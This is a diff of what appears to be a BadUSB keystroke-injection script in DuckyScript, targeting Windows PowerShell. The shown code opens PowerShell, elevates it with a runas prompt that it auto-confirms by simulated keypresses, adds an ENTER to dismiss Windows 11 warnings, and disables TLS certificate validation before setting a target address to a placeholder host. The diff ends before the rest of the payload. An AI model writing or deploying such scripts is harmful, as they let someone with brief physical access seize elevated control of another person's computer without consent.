@@ -6,18 +6,18 @@ DELAY 2000
 BACKSPACE
 STRING powershell
 ENTER
-DELAY 1000
+DELAY 2000
 
 REM Privilege Escalation
 STRINGLN start-process powershell.exe -verb runas
-DELAY 1000
+DELAY 2000
 LEFTARROW
 ENTER
 
 REM Payload
 DELAY 1000
 
-STRINGLN cd ~/Desktop/
+STRINGLN cd ~/
 STRINGLN add-type @"
 STRINGLN    using System.Net;
 STRINGLN    using System.Security.Cryptography.X509Certificates;
@@ -30,6 +30,9 @@ STRINGLN        }
 STRINGLN    }
 STRINGLN "@
 STRINGLN [System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
+DELAY 1000
+REM Windows 11 gives you warnings
+ENTER
 DELAY 1000
 
 STRINGLN $IP_ADDR = "https://127.0.0.1"
